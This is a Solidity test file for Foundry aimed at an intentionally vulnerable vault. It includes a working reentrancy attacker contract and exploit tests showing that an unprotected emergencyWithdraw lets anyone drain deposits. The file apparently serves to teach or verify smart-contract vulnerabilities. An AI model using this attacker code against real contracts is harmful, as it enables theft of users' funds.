// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";

/**
 * @title VulnerableVaultTest
 * @notice Base test file for the VulnerableVault
 * @dev This serves as a template for exploit tests
 */
contract VulnerableVaultTest is Test {
    VulnerableVault public vault;
    
    address public owner = makeAddr("owner");
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    address public attacker = makeAddr("attacker");
    
    uint256 constant INITIAL_DEPOSIT = 10 ether;
    
    function setUp() public {
        // Deploy vault as owner
        vm.prank(owner);
        vault = new VulnerableVault();
        
        // Fund test accounts
        vm.deal(alice, 100 ether);
        vm.deal(bob, 100 ether);
        vm.deal(attacker, 10 ether);
        
        // Alice and Bob make deposits
        vm.prank(alice);
        vault.deposit{value: INITIAL_DEPOSIT}();
        
        vm.prank(bob);
        vault.deposit{value: INITIAL_DEPOSIT}();
    }
    
    function test_NormalDeposit() public {
        assertEq(vault.balances(alice), INITIAL_DEPOSIT);
        assertEq(vault.balances(bob), INITIAL_DEPOSIT);
        assertEq(vault.getContractBalance(), INITIAL_DEPOSIT * 2);
    }
    
    function test_NormalWithdraw() public {
        uint256 aliceBalanceBefore = alice.balance;
        
        vm.prank(alice);
        vault.withdraw(5 ether);
        
        assertEq(vault.balances(alice), 5 ether);
        assertEq(alice.balance, aliceBalanceBefore + 5 ether);
    }
}

/**
 * @title ReentrancyAttacker
 * @notice Malicious contract to exploit reentrancy vulnerability
 */
contract ReentrancyAttacker {
    VulnerableVault public target;
    address public owner;
    uint256 public attackCount;
    uint256 public maxAttacks;
    
    constructor(address _target) {
        target = VulnerableVault(payable(_target));
        owner = msg.sender;
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        
        // Deposit first to have a balance
        target.deposit{value: msg.value}();
        
        // Set max attacks based on target balance
        maxAttacks = address(target).balance / msg.value;
        if (maxAttacks > 10) maxAttacks = 10; // Limit to prevent gas issues
        
        // Start the attack
        attackCount = 0;
        target.withdraw(msg.value);
    }
    
    receive() external payable {
        // Reentrancy: keep withdrawing while we have balance recorded
        if (attackCount < maxAttacks && address(target).balance >= 1 ether) {
            attackCount++;
            target.withdraw(1 ether);
        }
    }
    
    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Withdrawal failed");
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title ExploitReentrancy
 * @notice Test that proves the reentrancy vulnerability
 */
contract ExploitReentrancy is Test {
    VulnerableVault public vault;
    ReentrancyAttacker public attackerContract;
    
    address public owner = makeAddr("owner");
    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");
    
    function setUp() public {
        // Deploy vault
        vm.prank(owner);
        vault = new VulnerableVault();
        
        // Fund accounts
        vm.deal(victim, 100 ether);
        vm.deal(attacker, 10 ether);
        
        // Victim deposits funds
        vm.prank(victim);
        vault.deposit{value: 20 ether}();
        
        // Attacker deploys attack contract
        vm.prank(attacker);
        attackerContract = new ReentrancyAttacker(address(vault));
    }
    
    function test_ReentrancyExploit() public {
        uint256 vaultBalanceBefore = address(vault).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        
        console.log("Vault balance before:", vaultBalanceBefore);
        console.log("Attacker balance before:", attackerBalanceBefore);
        
        // Execute the attack
        vm.prank(attacker);
        attackerContract.attack{value: 1 ether}();
        
        // Withdraw stolen funds
        vm.prank(attacker);
        attackerContract.withdraw();
        
        uint256 vaultBalanceAfter = address(vault).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        
        console.log("Vault balance after:", vaultBalanceAfter);
        console.log("Attacker balance after:", attackerBalanceAfter);
        console.log("Attacker profit:", attackerBalanceAfter - attackerBalanceBefore);
        
        // Assert: Attacker should have more than they started with
        // This test PASSES if the vulnerability exists
        assertGt(
            attackerBalanceAfter,
            attackerBalanceBefore,
            "Reentrancy exploit should have stolen funds"
        );
        
        // Assert: Vault should have less than expected
        assertLt(
            vaultBalanceAfter,
            vaultBalanceBefore - 1 ether,
            "Vault should have lost more than the attacker deposited"
        );
    }
}

/**
 * @title ExploitAccessControl
 * @notice Test that proves the access control vulnerability
 */
contract ExploitAccessControl is Test {
    VulnerableVault public vault;
    
    address public owner = makeAddr("owner");
    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");
    
    function setUp() public {
        vm.prank(owner);
        vault = new VulnerableVault();
        
        vm.deal(victim, 100 ether);
        vm.deal(attacker, 1 ether);
        
        // Victim deposits funds
        vm.prank(victim);
        vault.deposit{value: 50 ether}();
    }
    
    function test_UnauthorizedEmergencyWithdraw() public {
        uint256 vaultBalance = address(vault).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        
        console.log("Vault balance:", vaultBalance);
        console.log("Attacker is not owner:", attacker != vault.owner());
        
        // Attacker calls emergencyWithdraw (should be owner-only but is not!)
        vm.prank(attacker);
        vault.emergencyWithdraw(attacker);
        
        uint256 attackerBalanceAfter = attacker.balance;
        
        console.log("Attacker balance after:", attackerBalanceAfter);
        
        // Assert: Attacker should have received all vault funds
        // This test PASSES if the vulnerability exists
        assertEq(
            attackerBalanceAfter,
            attackerBalanceBefore + vaultBalance,
            "Attacker should have stolen all funds via unauthorized emergencyWithdraw"
        );
        
        assertEq(
            address(vault).balance,
            0,
            "Vault should be empty"
        );
    }
}
